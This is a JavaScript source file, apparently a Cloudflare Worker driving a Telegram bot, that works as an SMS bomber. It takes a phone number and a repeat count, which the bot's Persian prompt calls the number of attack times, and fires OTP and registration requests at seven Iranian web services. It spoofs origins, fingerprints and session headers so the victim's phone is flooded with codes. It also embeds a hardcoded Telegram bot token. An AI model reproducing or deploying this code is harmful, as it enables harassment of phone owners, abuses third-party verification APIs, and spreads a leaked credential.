const runService = (
	{ name, headers = {}, api, params, method = 'POST' },
	id,
) => {
	const controller = new AbortController();
	const timeout = setTimeout(() => controller.abort(), 8000);

	try {
		let url = api;
		let body;

		if (method === 'GET' && params) {
			const qs = new URLSearchParams(params).toString();
			url += '?' + qs;
		} else if (params) {
			const contentType =
				headers['Content-Type'] || headers['content-type'];

			if (contentType?.includes('application/x-www-form-urlencoded')) {
				body = new URLSearchParams(params).toString();
			} else {
				body = JSON.stringify(params);
				headers['Content-Type'] ||= 'application/json';
			}
		}

		fetch(url, {
			method,
			headers,
			body,
			signal: controller.signal,
		}).then((res) => {
			if (!res.ok) {
				throw new Error(res?.status);
			}
			sendMessage(id, `${name} ✓ Success`)
		})
	} catch (err) {
		const status =
			err.name === 'AbortError' ? 'TIMEOUT' : err.message || 'Unknown';

		sendMessage(id, `${name} ✗ Failed (${status})`);
	} finally {
		clearTimeout(timeout);
	}
};


const getServices = (PHONE_NUMBER) => {
	return [
		{
			name: 'Aloghesti',
			api: 'https://api.aloghesti.com/api/v1/initial-user',
			params: { mobile: '0' + PHONE_NUMBER },
			headers: { Origin: 'https://aloghesti.com' },
			method: 'POST',
			enabled: true,
		},
		{
			name: 'Ammaryar',
			api: 'https://ammaryar.ir/register_ajax',
			params: { mobile: PHONE_NUMBER, conf: 1 },
			headers: {
				Origin: 'https://ammaryar.ir',
				Host: 'ammaryar.ir',
				'Content-Type': 'application/x-www-form-urlencoded',
			},
			method: 'POST',
			enabled: true,
		},
		{
			name: 'Okala',
			api: 'https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister',
			params: {
				mobile: '0' + PHONE_NUMBER,
				confirmTerms: true,
				notRobot: false,
				ValidationCodeCreateReason: 5,
				OtpApp: 0,
				deviceTypeCode: 10,
				IsAppOnly: false,
			},
			headers: {
				'session-id': randomUUID(),
				source: 'okala',
				'ui-version': '2.0',
				'x-correlation-id': randomUUID(),
				'x-user-unique-id': randomUUID(),
			},
			method: 'POST',
			enabled: true,
		},
		{
			name: 'Behtarino',
			api: 'https://bck.behtarino.com/api/v1/users/jwt_phone_verification/',
			params: { phone: '0' + PHONE_NUMBER },
			headers: { site: 'behtarino' },
			method: 'POST',
			enabled: true,
		},
		{
			name: 'Torob',
			api: 'https://api.torob.com/v4/user/phone/send-pin/',
			method: 'GET',
			params: {
				phone_number: '0' + PHONE_NUMBER,
				_http_referrer: 'https://www.google.com/',
				source: 'next_desktop',
				_landing_page: 'home',
			},
			headers: {
				Origin: 'https://torob.com',
				Referer: 'https://torob.com/',
				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
				Accept: '*/*',
			},
			enabled: true,
		},
		{
			name: 'DigikalaJet',
			api: 'https://api.digikalajet.ir/user/login-register/',
			method: 'POST',
			params: {
				phone: '0' + PHONE_NUMBER,
			},
			headers: {
				'app-id': 'c2bd4460-0e3f-41a7-922c-100b9cb15bd6',
				client: 'mobile',
				clientid: 'FINGERPRINT-' + randomUUID().replace(/-/g, ''),
				'clientid-v2': 'FINGERPRINTV2-' + randomUUID().replace(/-/g, ''),
				clientos: 'Linux',
				'content-type': 'application/json',
				origin: 'https://www.digikalajet.com',
				referer: 'https://www.digikalajet.com/',
				session: randomUUID() + '-V2*' + Date.now(),
				'x-request-uuid': randomUUID(),
				'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
				accept: 'application/json, text/plain, */*',
			},
			enabled: true,
		},
		{
			name: '123Kif',
			api: 'https://api.123kif.com/api/auth/Register',
			method: 'POST',
			params: {
				mobile: '0' + PHONE_NUMBER,
				password: '1234',
				firstName: 'test',
				lastName: 'test',
				refferCode: '',
				platform: 'web',
			},
			headers: {
				origin: 'https://123kif.com',
				referer: 'https://123kif.com/',
				'content-type': 'application/json; charset=UTF-8',
				zhoobinuname: 'f1656e60-242a-4136-7ca7-60bc69041d65',
			},
			enabled: true,
		},
	];
};

const TELEGRAM_BOT_TOKEN = '8309141293:AAHtu6KB0cSd7dYzfCW2m5OnngWQyMHbkqQ';

const ALLOWED_USERNAMES = ['tikrack'];

async function sendMessage(chatId, text) {
	const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
	const body = {
		chat_id: chatId,
		text: text,
		parse_mode: 'HTML',
	};

	return await fetch(url, {
		method: 'POST',
		headers: { 'Content-Type': 'application/json' },
		body: JSON.stringify(body),
	});
}

export default {
	async fetch(request) {
		if (request.method !== 'POST') {
			return new Response('Not Found', { status: 404 });
		}
		return new Response("ok");

		const {
			message: {
				text,
				from: { username, first_name },
				chat: { id, type },
			},
		} = await request.json();

		if (type !== 'private') {
			await sendMessage(
				id,
				`سلام سلام ${first_name} 😎✨
می‌دونم که می‌خوای استفاده کنی، ولی 😅 نمی‌تونی بدون حضور من!
باید بیای شخصی 🤝 تا بتونی بهره‌مند شی 🎉
نه توی گروه، نه چنل، نه جای دیگه! فقط شخصی 😇🪻
بخدا شرمندم، ولی اینم راهشه 😉🤗`,
			);
			return;
		}

		if (!ALLOWED_USERNAMES.includes(username)) {
			await sendMessage(
				id,
				`درود ${first_name} عزیز ✨
متاسفانه شما اجازه استفاده از ربات را ندارید! 🌹`,
			);
			return;
		}

		const pattern = /^\[Send\]\n(09\d{9})\n(\d+)$/;

		if (!pattern.test(text)) {
			await sendMessage(
				id,
				`🔥 لطفاً شماره مورد نظر رو <b>دقیقاً</b> در ساختار زیر ارسال کن
⚠️ <b>حتماً همین فرمت را رعایت کن!</b>
(👇 با کلیک روی باکس، متن خودکار کپی می‌شود)

<b>ساختار صحیح:</b>

<pre><code>[Send]
09991112233
10</code></pre>

⚡ پارامتر اول = شماره
⚡ پارامتر دوم = تعداد دفعات حمله`,
			);
		} else {
			const number = text.substring(6, 6 + 11);
			const repeat = text.substring(6 + 11, 6 + 11 + 2);

			await sendMessage(id, `runned ${number}`);
			for (const service of getServices(number)) {
				if (service.enabled) {
					await sendMessage(id, `runned ${service.name} jjjj`);
					runService(service, id);
				}
			}
		}
		return new Response('OK');
	},
};
